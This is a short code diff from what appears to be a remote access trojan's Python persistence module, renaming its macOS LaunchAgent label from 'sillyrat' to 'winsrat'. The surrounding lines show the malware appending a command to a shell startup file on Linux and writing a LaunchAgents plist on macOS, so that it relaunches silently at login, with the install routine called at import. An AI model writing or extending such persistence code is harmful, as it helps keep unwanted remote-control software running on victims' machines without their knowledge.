@@ -16,7 +16,7 @@ class Persistence:
                 with open(rc_path, 'a') as rc:
                     rc.write(f"\npython3 {sys.argv[0]} &\n")
             elif platform.system() == "Darwin":
-                plist = os.path.expanduser("~/Library/LaunchAgents/com.sillyrat.agent.plist")
+                plist = os.path.expanduser("~/Library/LaunchAgents/com.winsrat.agent.plist")
                 content = f"""<?xml version=\"1.0\" encoding=\"UTF-8\"?>
 <plist version=\"1.0\">
 <dict>
@@ -32,3 +32,4 @@ class Persistence:
 
 
 Persistence.install()
+
